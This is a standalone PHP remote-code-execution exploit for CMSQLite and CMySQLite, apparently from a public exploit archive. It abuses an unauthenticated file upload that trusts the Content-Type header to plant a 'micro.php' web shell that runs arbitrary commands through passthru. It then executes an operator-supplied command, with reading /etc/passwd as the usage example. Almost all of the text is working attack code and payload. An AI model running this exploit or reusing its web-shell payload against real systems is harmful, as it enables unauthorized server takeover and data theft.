#!/usr/bin/php -q -d short_open_tag=on
<?
echo "
CMSQLite <= 1.2 & CMySQLite <= 1.3.1 Remote Code Execution Exploit
by BlackHawk <hawkgotyou gmail com> <http://twitter.com/itablackhawk>
Thanks to rgod for the php code and Natural Killer

";
if ($argc<4) {
echo "Usage: php ".$argv[0]." Host Path CMD
Host:          target server (ip/hostname)
Path:          path of CMSQLite / CMySQLite
CMD:           A Shell Command

Example:
php ".$argv[0]." localhost /template/ cat /etc/passwd";

die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);


/*
Explanation:

No check of user rights when uploading a file, and file type is checked via
HTTP header Content-Type, wich can be different to the real.

exploit creates a micro.php shell on target site

*/

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];

$cmd="";
for ($i=3; $i<=$argc-1; $i++){
$cmd.=" ".$argv[$i];
}
$port=80;
$proxy="";

$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "- Uploading Shell Creator..\r\n";

$data="-----------------------------7d529a1d23092a\r\n";
$data.="Content-Disposition: form-data; name=\"fileName\"; filename=\"oh_my_shell.php\"\r\n";
$data.="Content-Type: application/zip\r\n\r\n";
$data.="<?php
\$fp=fopen('micro.php','w');
fputs(\$fp,'<?php error_reporting(0);
set_time_limit(0);
if (get_magic_quotes_gpc()) {
\$_GET[cmd]=stripslashes(\$_GET[cmd]);
}
echo 666999;
passthru(\$_GET[cmd]);
echo 666999;
?>');
fclose(\$fp);
chmod('micro.php',777);
?>\r\n";
$data.='-----------------------------7d529a1d23092a
Content-Disposition: form-data; name="upload"

1
-----------------------------7d529a1d23092a--
';
$packet="POST ".$p."admin/mediaAdmin.php HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
$packet.="Referer: http://".$host.$path."/example.html\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);

echo "- Creating the Shell..\r\n";
$packet ="GET ".$p."media/oh_my_shell.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(3);

echo "- Execute Commands..\r\n";
$packet ="GET ".$p."media/micro.php?cmd=$cmd HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (strstr($html,"666999"))
{
  echo "Exploit succeeded...\r\n";
  $temp=explode("666999",$html);
  die("\r\n".$temp[1]."\r\n");
}

?>